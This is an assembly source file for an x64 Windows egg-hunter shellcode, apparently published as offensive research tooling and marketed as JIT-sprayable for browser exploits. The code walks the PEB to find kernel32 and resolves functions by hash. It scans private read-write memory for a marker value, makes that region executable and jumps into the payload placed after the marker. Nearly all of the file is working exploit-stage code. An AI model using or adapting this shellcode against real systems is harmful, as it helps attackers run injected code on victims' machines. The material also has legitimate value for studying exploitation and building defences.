;;;;MMMMMMMMMMMMMMMMMMMMMWNXK0kxdooodddooloxO0KNWMMMMMMMMMMMMMMMMMMMMMMMMM
;;;;MMMMMMMMMMMMMMMMMWXOxl:;'... ...';;,,'.....;oxOKNWMMMMMMMMMMMMMMMMMMMM
;;;;MMMMMMMMMMMMMMWXOdlc:;;;:cc::;,',lxxxxo:,....,,,:lkKWMMMMMMMMMMMMMMMMM
;;;;MMMMMMMMMMMMN0dc:::loxkO0OOkxxdl:cdOOOOxoc;',lc'..';lkXWMMMMMMMMMMMMMM
;;;;MMMMMMMMMMNkc'...';ldkkO0Oxdoc:;,,;::::cclc,:xxc,',,'';dKWMMMMMMMMMMMM
;;;;MMMMMMMMW0l,...,coddooolc;,'.... .....  .,;,cdxdl:cc,'..,dXMMMMMMMMMMM
;;;;MMMMMMMNx;....cdxdddol:;;;::cccc::::;;'.''...':looddl;'...:kNMMMMMMMMM
;;;;MMMMMMNd'...'cddxdoc::codxOO000OOOOkkxdlll,....,coxxxo:'...'oXMMMMMMMM
;;;;MMMMMNd'.  .colll;,,:lddxkkdlc;;;;:::loodxo:,,'',cddxxdc,....lXMMMMMMM
;;;;MMMMNd.   'okxdl'.':looooc;'''''.......';ldddl::;,;oxxxd:'....lXMMMMMM
;;;;MMMMO,  .,d0Oko' .,lddl;'',:looollll:,....;oddxo:'.,oxxxo:'....oNMMMMM
;;;;MMMWd....;xOkx;  .,oOx;..;ccc:cc:;;:codc'..'lxkxc'..;oxxxl'....,kWMMMM
;;;;MMMNo....;xOkd'  .:xOl'':oc;:;;:::;'.'lx:.  'oxxl,..'cdddl;'....lXMMMM
;;;;MMMXc....:xxxo.  .:xkl',ll;;;,::;,;:,.,oo'. .:ddl,...,oodoc,....,OMMMM
;;;;MMMXc....,dkkd'  .,oOx;,:oc,,,;;'':c,.'lo'  .;ddo;...,odddl'....'xWMMM
;;;;MMMNo..  ,xOkd;  ..:kOo;,:lc;,,,;:;,..:dc.. .cxxd;...,odddc'.....oNMMM
;;;;MMMWk'  .,oxxdo' ..,lxkdc,,;:::::,'',cdd;...,dxkl'...cddxd:'.....oNMMM
;;;;MMMMXc....,lkkko'....,lxkxl;,''',;lodo:'...'lxxo,.  'odddo;......dWMMM
;;;;MMMMMKc....,oOOkd:.  ..,:looooooolc:,... .'lddl,.  .cooddc,.....,OWMMM
;;;;MMMMMWKc.  .,okkkxl;.. ...........     ..;cll:.   .:oddxo;......cKMMMM
;;;;MMMMMMMXl....'cdxdlodl;'..         ...;col:;'.   .:oodxo:......,kWMMMM
;;;;MMMMMMMMNx;....';;coxkxdol:;''',;:ccldxxxo:'....;loodxo:'......oNMMMMM
;;;;MMMMMMMMMWKd;......,cddddkkdl::ccllolc:,'.....,coodxxo:''.....cKMMMMMM
;;;;MMMMMMMMMMMWXxc,..  ..',;cloo:'',,,,'.......';:cclooc,'......:0WMMMMMM
;;;;MMMMMMMMMMMMMMN0d:.. .......,;,. ....  ...,;,,;:::;'........;OWMMMMMMM
;;;;MMMMMMMMMMMMMMMMWN0xl:,......';,'......,,'''',,,'..........cKWMMMMMMMM
;;;;MMMMMMMMMMMMMMMMMMMMMWXK0Okxxkkdcc:::::::,'...........  ..:KMMMMMMMMMM
;;;;MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN0xool::clll:;,''........':kWMMMMMMMMMM
;;;;MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNXOxoc:;;;::::;,,'',cdONMMMMMMMMMMM
;;;;MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX0xdl:;;,,,;:ok0NMMMMMMMMMMMMM
;;;;MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXKK000KNWMMMMMMMMMMMMMMMM
;;;;----------------------------------------------------------------------;
;;;; x64 Egg Hunter Shellcode                                             ;
;;;;----------------------------------------------------------------------;
;;;; Author: Forrest Orr - 2021                                           ;
;;;;----------------------------------------------------------------------;
;;;; Contact: forrest.orr@protonmail.com                                  ;
;;;;----------------------------------------------------------------------;
;;;; Licensed under GNU GPLv3                                             ;
;;;;______________________________________________________________________;
;;;; ## Features                                                          ;
;;;;                                                                      ;
;;;; ~ JIT sprayable: entire shellcode can be represented using valid     ;
;;;;   double float constants.                                            ;
;;;; ~ Optimized size of 673 bytes is below the 800 byte JIT spray        ;
;;;;   threshold in engines such as IonMoney.                             ;
;;;; ~ Dynamic module base resolution via name hash                       ;
;;;; ~ Dynamic export address resolution via name hash                    ;
;;;; ~ Export forwarding support                                          ;
;;;; ~ Stable and tested on any version of Windows 7, 8.1 or 10           ;
;;;; ~ Uses KERNEL32.DLL!VirtualQuery to scan through all regions of      ;
;;;;   committed +RW private memory for the configured egg value          ;
;;;; ~ Sets entire region of memory containing the egg to +RWX using      ;
;;;;   KERNEL32.DLL!VirtualProtect                                        ;
;;;; ~ Egg is wiped with 0's to signal that the egghunter was successful. ;
;;;;______________________________________________________________________;

%Include       "..\Include\Windows.inc"
Bits           64

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;                 Macros, definitions and settings                    ;;;  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

%Define EGG 8877665544332211h
%Define EGG_SIZE 8

;%Define DEBUG
%Ifdef DEBUG
Global Egghunter64
%Endif

%Macro x64AlignStackM 0

Sub            Rsp, 08h                                                        ; Subtract an additional Quadword from the stack pointer.
And            Spl, 0F7h                                                       ; Align stack, 11110111 (1000 is 08h), Spl is 8-bit Rsp

%EndMacro

%Macro x64AlignCallM 1                                                         ; This can only be used if there are less than 4 params, otherwise we must have a definite knowledge of the stack subtraction size

Push           Rbp
Mov            Rbp, Rsp
Sub            Rsp, 20h                                                        ; Minimum stack space for 4 default fastcall registers.
x64AlignStackM
Call           %1
Mov            Rsp, Rbp
Pop            Rbp

%EndMacro

EggHunter64_Mbi                Equ -MEMORY_BASIC_INFORMATION64_size
EggHunter64_EggTest            Equ (-MEMORY_BASIC_INFORMATION64_size - 8)
Egghunter64_dwOldProtect       Equ (-MEMORY_BASIC_INFORMATION64_size - (8 * 2))
EggHunter64_StackSize          Equ -Egghunter64_dwOldProtect

Section .text

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;                     Primary egg hunter logic                        ;;;  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

Egghunter64:

Push           Rbp
Mov            Rbp, Rsp
Sub            Rsp, EggHunter64_StackSize 
x64AlignStackM
%Ifdef DEBUG
Mov            Rax, EGG
Mov            Qword [Rbp + EggHunter64_EggTest], Rax
%Endif
Mov            Rcx, 000D4E88h                                                  ; Kernel32.dll string hash. The hashing algorithm is case insensitive (forced uppercase)
Call           GetModuleBase64
Mov            Rdi, Rax
Mov            Rdx, 0x000e33d2                                                 ; VirtualQuery
Mov            Rcx, Rax
Call           ResolveExportAddress64
Mov            R13, Rax ; R12-15 are non-volatile: R13 is the address of KERNEL32.DLL!VirtualQuery
Xor            R12, R12 ; Start query memory at address 0, moving forward based on existing region sizes returned by VirtualQuery
Xor            R14, R14 ; Current region size
Xor            R15, R15 ; Egg address (if found)

.ScanNextRegion:

Test           R15, R15
Jnz            Egghunter64.ScanFinished
Add            R12, R14
Mov            R8, MEMORY_BASIC_INFORMATION64_size
Lea            Rdx, Qword [Rbp + EggHunter64_Mbi]
Mov            Rcx, R12
x64AlignCallM  R13   
Cmp            Rax, MEMORY_BASIC_INFORMATION64_size
Jne            Egghunter64.ScanFinished
Lea            Rax, Qword [Rbp + EggHunter64_Mbi]
Mov            R14, Qword [Rax + MEMORY_BASIC_INFORMATION64.RegionSize]
Cmp            Dword [Rax + MEMORY_BASIC_INFORMATION64.Type], MEM_PRIVATE
Jne            Egghunter64.ScanNextRegion
Cmp            Dword [Rax + MEMORY_BASIC_INFORMATION64.State], MEM_COMMIT
Jne            Egghunter64.ScanNextRegion
Cmp            Dword [Rax + MEMORY_BASIC_INFORMATION64.Protect], PAGE_READWRITE
Jne            Egghunter64.ScanNextRegion
Mov            Rcx, R14
Sub            Rcx, EGG_SIZE
Xor            Rdx, Rdx ; Counter
Dec            Rdx ; Start it at -1
Mov            Rbx, EGG

.ScanNextQword:

Inc            Rdx
Cmp            Rdx, Rcx
Jge            Egghunter64.ScanNextRegion ; Counter greater than or equal to the region size (minus egg size)? If so end the egg scan for this region.
Cmp            Qword [R12 + Rdx * 1], Rbx
Je             Egghunter64.EggFound
Jmp            Egghunter64.ScanNextQword

.EggFound:

Lea            R15, Qword [R12 + Rdx * 1]
Mov            Rax, Qword [GS:0x8] ; Stack base (highest address) - 0000000000150000
Cmp            R15, Rax
Jg             Egghunter64.Stackless
Mov            Rax, Qword [GS:0x10] ; Stack limit (lowest address) - 000000000014D000
Cmp            R15, Rax
Jl             Egghunter64.Stackless
Xor            R15, R15 ; Egg was within stack memory - skip it.
Jmp            Egghunter64.ScanNextQword        

.Stackless:

Xor            Rcx, Rcx
Mov            Qword [R12 + Rdx * 1], Rcx                                      ; Wipe the egg to signify it has been identified
Mov            Rdx, 0038d13ch                                                  ; VirtualProtect
Mov            Rcx, Rdi
Call           ResolveExportAddress64
Mov            Qword [Rbp + Egghunter64_dwOldProtect], 0
Lea            R9, Qword [Rbp + Egghunter64_dwOldProtect]
Mov            R8, PAGE_EXECUTE_READWRITE
Lea            Rdx, Qword [Rbp + EggHunter64_Mbi]
Mov            Rdx, Qword [Rdx + MEMORY_BASIC_INFORMATION64.RegionSize]
Mov            Rcx, R12 ; use the region base address, not literal egg hunter address in R15 
x64AlignCallM  Rax   
Add            R15, EGG_SIZE
Jmp            R15
Jmp            Egghunter64.ScanFinished

.ScanFinished:

Mov            Rsp, Rbp
Pop            Rbp
Ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;                          GetModuleBase64                            ;;;  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

GetModuleBase64:                                                               ; Rcx = the string hash of the target module base name (not full path)

Push           R8                                                              ; Walk through the load order module list in the PEB by flink until either the initial module in the list (Ntdll.dll) is reached again, or a NULL entry is identified.
Push           Rdi
Push           Rsi
Mov            R8, Rcx                                                         ; We need Rcx to pass parameters to GetFunctionHash. Store the target hash in R8 and restore it before returning.
Mov            Rsi, TIB64.pPEB
Gs             Lodsq
Mov            Rax, Qword [Rax + PEB64.pLDRData]
Mov            Rdi, Qword [Rax + PEB_LDR_DATA64.pInLoadOrderModuleList]
Mov            Rsi, Rdi                                                        ; Rsi will be my moving module entry pointer, while Rdi will be a static reference to the initial load order module (should always be Ntdll.dll)
Xor            Rax, Rax                                                        ; If the list pointer is invalid, we still need to return 0.
Jmp            GetModuleBase64.CheckValidModuleEntry                           ; Since Rsi and Rdi will be equal when the loop begins, skip the Ntdll check on the first iteration.

.CheckNextModuleEntry:                                                         ; Rsi = current module, Rdi = Ntdll module, R8 = target module name hash. Rax will be the module base after loop exits, assuming it was ever found

Cmp            Rdi, Rsi
Je             GetModuleBase64.FinalModuleEntry

.CheckValidModuleEntry:

Test           Rsi, Rsi
Jz             GetModuleBase64.FinalModuleEntry
Lea            Rbx, Qword [Rsi + LDR_MODULE64.usBaseDllName]
Test           Rbx, Rbx
Jz             GetModuleBase64.LoadNextModuleEntry
Mov            Rdx, 1                                                          ; Unicode string boolean
Mov            Rcx, Qword [Rbx + UNICODE_STRING64.Buffer]
Test           Rcx, Rcx
Jz             GetModuleBase64.LoadNextModuleEntry
Call           GetStringHash64
Cmp            Rax, R8
Je             GetModuleBase64.FoundTargetModule

.LoadNextModuleEntry:

Xor            Rax, Rax                                                        ; This will ensure we return 0 in the event the target module is not found.
Mov            Rsi, Qword [Rsi + LDR_MODULE64.Flink]
Jmp            GetModuleBase64.CheckNextModuleEntry

.FoundTargetModule:

Mov            Rax, Qword [Rsi + LDR_MODULE64.pBase]

.FinalModuleEntry:

Pop            Rsi
Pop			   Rdi
Pop            R8
Ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;                      ResolveExportAddress64                         ;;;  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

ResolveExportAddress64pModuleBase                Equ -08h
ResolveExportAddress64qwTargetFunctionHash       Equ -10h
ResolveExportAddress64pImageExportTable          Equ -18h
ResolveExportAddress64pdwAddressOfNames          Equ -20h
ResolveExportAddress64pwAddressOfNameOrdinals    Equ -28h
ResolveExportAddress64pdwAddressOfFunctions      Equ -30h
ResolveExportAddress64qwFunctionAddress          Equ -38h
ResolveExportAddress64dwExportTableSize          Equ -40h
ResolveExportAddress64pForwardedModuleBase       Equ -48h
ResolveExportAddress64ForwardedFunctionName      Equ -150h ; 100h is 256, clean multiple of 8 for stack alignment.
ResolveExportAddress64ForwardedModuleName        Equ -250h
ResolveExportAddress64StackSize                  Equ 250h

ResolveExportAddress64:

Bits           64
Push           Rbp
Mov            Rbp, Rsp
Sub            Rsp, ResolveExportAddress64StackSize
Push           Rdi
Push           Rsi
Mov            Qword[Rbp + ResolveExportAddress64pModuleBase], Rcx
Mov            Qword[Rbp + ResolveExportAddress64qwTargetFunctionHash], Rdx
Xor            Rbx, Rbx
Mov            Ebx, Dword[Rcx + IMAGE_DOS_HEADER.e_lfanew]
Add            Rcx, Rbx
Add            Rcx, (IMAGE_FILE_HEADER_size + 4)
Mov            Rsi, Qword[Rbp + ResolveExportAddress64pModuleBase]
Xor            Rbx, Rbx
Mov            Ebx, Dword[Rcx + IMAGE_OPTIONAL_HEADER64.DataDirectory]
Add            Rsi, Rbx
Mov            Qword[Rbp + ResolveExportAddress64pImageExportTable], Rsi
Mov            Eax, Dword[Rcx + IMAGE_OPTIONAL_HEADER64.DataDirectory + 4]; Size field in first data directory(export address table)
Mov            Dword[Rbp + ResolveExportAddress64dwExportTableSize], Eax
Mov            Rax, Qword[Rbp + ResolveExportAddress64pModuleBase]
Mov            Ebx, Dword[Rsi + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
Add            Rax, Rbx
Mov            Qword[Rbp + ResolveExportAddress64pdwAddressOfNames], Rax
Mov            Rax, Qword[Rbp + ResolveExportAddress64pModuleBase]
Xor            Rbx, Rbx
Mov            Ebx, Dword[Rsi + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
Add            Rax, Rbx
Mov            Qword[Rbp + ResolveExportAddress64pwAddressOfNameOrdinals], Rax
Mov            Rax, Qword[Rbp + ResolveExportAddress64pModuleBase]
Mov            Ebx, Dword[Rsi + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
Add            Rax, Rbx
Mov            Qword[Rbp + ResolveExportAddress64pdwAddressOfFunctions], Rax
Xor            Rsi, Rsi
Mov            Qword[Rbp + ResolveExportAddress64qwFunctionAddress], Rsi

.GetFunctionName:; Rsi = Current function index(should be initialized to 0)

Mov            Rax, Qword[Rbp + ResolveExportAddress64pImageExportTable]
Mov            Eax, Dword[Rax + IMAGE_EXPORT_DIRECTORY.NumberOfNames]
Cmp            Rax, Rsi
Jbe            ResolveExportAddress64.ReturnHash
Mov            Rax, Rsi
Lea            Rcx, Qword[Rax * 4]
Mov            Rdx, Qword[Rbp + ResolveExportAddress64pdwAddressOfNames]
Mov            Rax, Qword[Rbp + ResolveExportAddress64pModuleBase]
Mov            Ebx, Dword[Rcx + Rdx]
Add            Rax, Rbx
Xor            Rdx, Rdx; Set Unicode boolean to false, function names are always ANSI from the export address table
Mov            Rcx, Rax
Call           GetStringHash64
Cmp            Eax, Dword[Rbp + ResolveExportAddress64qwTargetFunctionHash]; Explicitly check 32 - bits, otherwise long function names may produce hashes which require 64 bits.
Jnz            ResolveExportAddress64.NextFunctionName ; At this state we've confirmed the function name hashes match and have already saved the function address - JMPing to ReturnHash would be fine if we didn't care about checking for export forwarding.
Mov            Rax, Rsi
Lea            Rdx, Dword[Rax + Rax]
Mov            Rax, Qword[Rbp + ResolveExportAddress64pwAddressOfNameOrdinals]
Movzx          Rax, Word[Rdx + Rax]
Lea            Rcx, Qword[Rax * 4]
Mov            Rdx, Qword[Rbp + ResolveExportAddress64pdwAddressOfFunctions]
Mov            Rax, Qword[Rbp + ResolveExportAddress64pModuleBase]
Mov            Ebx, Dword[Rcx + Rdx]
Add            Rax, Rbx
Mov            Qword[Rbp + ResolveExportAddress64qwFunctionAddress], Rax; We've resolved the address of the target function. However this may be a forwarder string, not code. Check and see if the address is within the export table to determine this.
Mov            Rcx, Qword[Rbp + ResolveExportAddress64pImageExportTable]
Mov            Rdx, Rcx
Xor            Rbx, Rbx
Mov            Ebx, Dword[Rbp + ResolveExportAddress64dwExportTableSize]
Add            Rdx, Rbx
Cmp            Rax, Rcx
Jl             ResolveExportAddress64.ReturnHash; Function address below the start of the EAT ? If so it's a legit function.
Cmp            Rax, Rdx
Jge            ResolveExportAddress64.ReturnHash; Function address above the end of the EAT ? If so it's a legit function in this context.
Mov            Qword[Rbp + ResolveExportAddress64qwFunctionAddress], 0 ; The function address falls within the EAT.We can assume that it is a forwarder.Extract the module / function name : <Module name(no extension)>.<Function name>

%Ifdef FORWARDED_API_SUPPORT
Xor            Rcx, Rcx; Forwarder string counter
Nop ; Float conversion
Lea            Rbx, Qword[Rbp + ResolveExportAddress64ForwardedModuleName]; Initially the buffer register will point to the module name since this field comes first.

.ExtractForwarder:

Mov            Dl, Byte[Rax + Rcx]
Cmp            Dl, 0
Je             ResolveExportAddress64.ResolveForwarder
Cmp            Dl, '.'
Jne            ResolveExportAddress64.NextForwarderByte
Mov            Dword[Rbx], '.dll'; The module name in a forwarder will not include a.dll extension.Add it so that we can generate a name hash which may match a module in the PEB loader list.
Add            Rbx, 4
Mov            Byte[Rbx], 0; Finalize module name string with null terminator
Lea            Rbx, Qword[Rbp + ResolveExportAddress64ForwardedFunctionName]; Switch the buffer register and begin building the function string
Inc            Rcx; Skip the '.' seperator
Jmp            ResolveExportAddress64.ExtractForwarder

.NextForwarderByte:

Mov            Byte[Rbx], Dl
Inc            Rcx
Inc            Rbx
Jmp            ResolveExportAddress64.ExtractForwarder

.ResolveForwarder:

Mov            Byte[Rbx], 0; Finalize the function name string with a null terminator.
; Lea            Rdx, Qword[Rbp + ResolveExportAddress64ForwardedFunctionName]
Xor            Rdx, Rdx
Lea            Rcx, Qword[Rbp + ResolveExportAddress64ForwardedModuleName]
Call           GetStringHash64
Mov            Rcx, Rax
Call           GetModuleBase64
Test           Rax, Rax
Jz             ResolveExportAddress64.ReturnHash; Failed to find the forwarded module in the PEB loader list.This could be because it is an API set(and these will never be in the list) or a module which simply has not been loaded yet.
Mov            Qword[Rbp + ResolveExportAddress64pForwardedModuleBase], Rax
Xor            Rdx, Rdx
Lea            Rcx, Qword[Rbp + ResolveExportAddress64ForwardedFunctionName]
Call           GetStringHash64
Mov            Rdx, Rax
Mov            Rcx, Qword[Rbp + ResolveExportAddress64pForwardedModuleBase]
Call           ResolveExportAddress64
Mov            Qword[Rbp + ResolveExportAddress64qwFunctionAddress], Rax
Jmp            ResolveExportAddress64.ReturnHash
%Endif

.NextFunctionName:

Inc            Rsi
Nop ; Double float conversion fix
Jmp            ResolveExportAddress64.GetFunctionName

.ReturnHash:

Mov            Rax, Qword[Rbp + ResolveExportAddress64qwFunctionAddress]
Pop            Rsi
Pop            Rdi
Mov            Rsp, Rbp
Pop            Rbp
Ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;                          GetStringHash64                            ;;;  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

GetStringHash64:                                                               ; Rcx = pointer to string, Rdx = boolean yes unicode or no unicode

Push           Rdi
Mov            Rdi, Rdx
Xor            Rbx, Rbx

.HashNextByte:

Cmp            Byte [Rcx], 0
Je             GetStringHash64.HashGenerated
Movzx          Eax, Byte [Rcx]
Or             Al, 60h
Movzx          Edx, Al
Add            Ebx, Edx
Shl            Rbx, 1
Inc            Rcx
Test           Rdi, Rdi
Jz             GetStringHash64.HashNextByte
Inc            Rcx                                                             ; Skip an extra byte if this is a unicode string
Jmp            GetStringHash64.HashNextByte

.HashGenerated:

Mov            Rax, Rbx
Pop            Rdi
Ret

End:
